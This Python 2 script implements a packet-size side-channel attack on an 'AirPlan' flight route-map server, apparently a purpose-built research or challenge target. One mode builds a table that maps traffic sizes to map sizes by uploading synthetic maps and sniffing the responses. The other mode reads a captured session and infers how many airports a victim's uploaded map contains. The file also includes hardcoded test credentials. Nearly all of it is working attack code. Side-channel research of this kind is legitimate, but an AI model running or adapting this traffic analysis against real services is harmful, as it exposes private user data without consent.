from __future__ import division
import processpackets
import packetcollector
import airplan_client
from airplan_client import AirPlanClient
import argparse
import json
import time
import os


class MapSizeAttack(object):
    MIN_GRAPH_PACKET_SIZE = 3300
    HEADER_SLACK = 5000 # how much variation we allow in packet size due to header differences
    ALLOWED_VARIATION=64 # variation allowed in the upload/properties packets we check prior to the graph matrix packet

    def __init__(self, ip, port, interface):
        self.ip = ip
        self.port = port
        self.interface = interface

    # determine the number of flights of graphs uploaded in session recorded in pcapfile
    def find(self, pcapfile, db, properties_db):
        with open(db, 'r') as reader:
            size_map = json.load(reader)
        with open(properties_db, 'r') as reader:
            properties_map = json.load(reader)
        self.SELECTOR_URL_SIZE = int(properties_map["URL_size"])
        self.SELECTOR_SIZE = int(properties_map["selector_size"])
        self.CONNECTED_GRAPH_PROPERTIES_SIZE = int(properties_map["connected"])
        self.DISCONNECTED_GRAPH_PROPERTIES_SIZE = int(properties_map["disconnected"])
        packets = processpackets.read_pcap(pcapfile)
        transactions = processpackets.get_transactions(packets, self.ip, int(self.port))
        # look at 4 consecutive transactions for upload, weight selection, then properties, then graphmatrix
        for i in range(len(transactions)-3):
            pot_upload = transactions[i]
            pot_selector = transactions[i+1]
            pot_properties = transactions[i+2]
            pot_matrix = transactions[i+3]

            #resp_size = pot_properties.resp.get_size()

            if abs(pot_upload.resp.get_size() - self.SELECTOR_URL_SIZE) > self.ALLOWED_VARIATION:
                continue # first transaction doesn't look like an upload
            if abs(pot_selector.resp.get_size() - self.SELECTOR_SIZE) > self.ALLOWED_VARIATION:
                continue # second transaction doesn't look like the weight selector for properties viewing
            if abs(pot_properties.resp.get_size() - self.CONNECTED_GRAPH_PROPERTIES_SIZE) > 4*self.ALLOWED_VARIATION and \
                    abs(pot_properties.resp.get_size() - self.DISCONNECTED_GRAPH_PROPERTIES_SIZE) > 4*self.ALLOWED_VARIATION:
                continue # third transaction should be a properies packet... in the benign case those sizes will vary
            # if we get here, we can be pretty confident that we're looking at a graph matrix packet
            size = pot_matrix.resp.get_size()

            if size > self.MIN_GRAPH_PACKET_SIZE:
                try:
                    v = size_map[size]
                    print "Map with " + str(v) + " airports was uploaded"
                except Exception as e:
                    # if size wasn't found, see how close two closest sizes are
                    v = self.find_closest(size_map, size)
                    if v!=None:
                        print "Map likely to have " + str(v) + " airports was uploaded"
                    else:
                        pass # most likely happened because we were looking at a packet containing something other than the "stupid form" graph

    # map is from packet size to num flights, size is the size of an unknown packet
    # find the num flights that had the closest graph size
    def find_closest(self, map, size):
        keys = sorted([int(key) for key in map.keys()])
        for i in range(len(keys)):
            if keys[i]>size:
                break
        if i == len(keys)-1: # we never found a bigger size, so just return the biggest one
            return map[str(keys[i])]

        if i==0: # all are bigger, so just return the smallest
            return map[str(keys[0])]
        # otherwise, determine whether the one below or above is closer
        deltai = abs(keys[i]-size)
        deltaiminus1 = abs(keys[i-1] - size)
        if deltai < deltaiminus1:
            if deltai < self.HEADER_SLACK:
                return map[str(keys[i])]
            else:
                print "Not quite close enough to " + str(keys[i]) + " for " + str(map[str(keys[i])])
                return None
        else:
            if deltaiminus1 < self.HEADER_SLACK:
                return map[str(keys[i-1])]
            else:
                print "Not quite close enough to " +  str(keys[i-1]) + " for " + str(map[str(keys[i-1])])
                return None

    # preliminary analysis to allow us to determine the correspondence between packet sizes and number of flights in graphs
    def build(self, username, password, outfile):
        airplan = AirPlanClient(self.ip, self.port, username, password)
        with airplan_client.get_session() as session:
            airplan.login(session)

            size_map = {}
            dir = "/tmp/airplan/"
            dir_already_existed = os.path.exists(dir)
            if not dir_already_existed:
                os.mkdir(dir)
            # Note: airplan runs out of memory generating the MapMatrix
            # table at around 1600 nodes or so; however a map is limited
            # internally at 750 nodes because the time to load and respond
            # becomes too long around that size
            for i in range(1, 461):
                mapfile = dir + "map_" + str(i) + ".txt"
                with open(mapfile, 'w') as mapwriter:
                    self.write_map(i, mapwriter)
                with packetcollector.PacketCollector(self.interface, "tcp port {}".format(self.port)) as packet_collector:
                    name = "map_" + str(i)
                    loc = mapfile
                    airplan.uploadRouteMap(session, loc, name)
                    print "uploading map " + loc
                    airplan.passengerCapacity(session, airplan.propertiesURL)

                    # give it time for the packets to be collected
                    time.sleep(5)
                    packet_collector.stop()
                    pcap = packet_collector.get_pcap()
                    transactions = processpackets.get_transactions(pcap, self.ip, int(self.port))

                    if len(transactions)!=3:
                        print "skipping " + loc + " due to missing packet "
                        with open(mapfile, 'r') as routeMap:
                            data = routeMap.read()
                            print "map " + str(data)
                        continue
                    else:
                        size = transactions[2].get_resp_size()
                        print "size " + str(size)
                        size_map[i] = size
                os.remove(mapfile)
            if not dir_already_existed:
                os.rmdir(dir)

        # Write the inverted map (response size -> number of flights) to the output file
        print "saving to " + outfile
        with open(outfile, 'w') as writer:
            json.dump(dict(zip(size_map.values(), size_map.keys())), writer)

    def write_map(self, i, mapwriter):
        mapwriter.write("%d\n" % i)
        for line in range(i):
            mapwriter.write("%d\n" % line)
        mapwriter.write("%d\n" % i)
        for line in range(i):
            mapwriter.write("%d 0 1 0 0 0 0 0\n" % line)

    def observe_packet_size(self, airplan, session, map, name):
        with packetcollector.PacketCollector(self.interface, "tcp port {}".format(self.port)) as packet_collector:
            response = airplan.uploadRouteMap(session, map, name)
            response = airplan.passengerCapacity(session, airplan.propertiesURL)
            # give it time for the packets to be collected
            time.sleep(5)
            packet_collector.stop()
            pcap = packet_collector.get_pcap()
            transactions = processpackets.get_transactions(pcap, self.ip, int(self.port))

            if len(transactions)!=3:
                print "skipping " + map + " due to missing packet"

                # print statements are here to provide more information upon failure
                print "number of transactions " + str(len(transactions))
                for tran in transactions:
                    print str(tran) + "  size:" + str(tran.get_resp_size())
                print "Response " + response.text
                return -1
            else:
                size = transactions[2].get_resp_size()
                return size

    # basic sanity check on packet sizes to see if we can uniquely determine number of flights
    def is_attack_viable(self):
        # compare sizes of packets for some maps to see if there's hope of differentiating
        map1a = "./maps/almost_densemap10.txt"  # a map of size 10 with large capacities and lots of edges
        map2 = "./maps/sparsemap11.txt"  # a map of size 11 with small no edges

        airplan1 = AirPlanClient(self.ip, self.port, "czechoslovakianairlinesflyingyou", "sDda8d9fh")

        # separate client, as different usernames can mask size of map
        airplan2 = AirPlanClient(self.ip, self.port, "usr", "pwd")

        # assume viable if the largest observed size for a map with 2 nodes is less than the smallest observed size for a map with 3 nodes
        max2 = -1
        min3 = -1

        # try up to 5 times to see if the above is violated (multiple attempts needed in case of random padding)
        for i in range(5):

            with airplan_client.get_session() as session:
                airplan1.login(session)
                size = self.observe_packet_size(airplan1, session, map1a, "map2a_" + str(i))
                if size > max2:
                    max2 = size

            with airplan_client.get_session() as session:
                airplan2.login(session)
                size = self.observe_packet_size(airplan2, session, map2, "map3_" + str(i))
                if size < min3 or min3 == -1:
                    min3 = size

            if max2 >= min3:
                return False

        return True  # note: there's a small probability that the attack isn't actually viable and we just didn't do enough iterations to see it


if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("serverip", help="the server ip address")
    parser.add_argument("serverport", help="the server port")
    parser.add_argument("username", help="a username to use to login")
    parser.add_argument("password", help="the password for the username")
    parser.add_argument("interface", help="the interface to use when building the database (required when building)")

    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database')
    buildparser.add_argument("outfile", help="specify the filename for the database to build")
    findparser = subparsers.add_parser('attack', help='determine the sizes of the maps uploaded during a session')
    findparser.add_argument("pcap", help="pcap of a session")
    findparser.add_argument("db", help="mapping of packet sizes to number of nodes in map ")
    findparser.add_argument("properties_db", help="data on sizes of packets that come before the graph matrix ")

    args = parser.parse_args()
    attack = MapSizeAttack(args.serverip, args.serverport, args.interface)
    if args.command == 'build':
        attack.build(args.username, args.password, args.outfile)
    elif args.command == 'attack':
        if attack.is_attack_viable():
            attack.find(args.pcap, args.db, args.properties_db)
        else:
            print "Cannot determine number of nodes from map size"
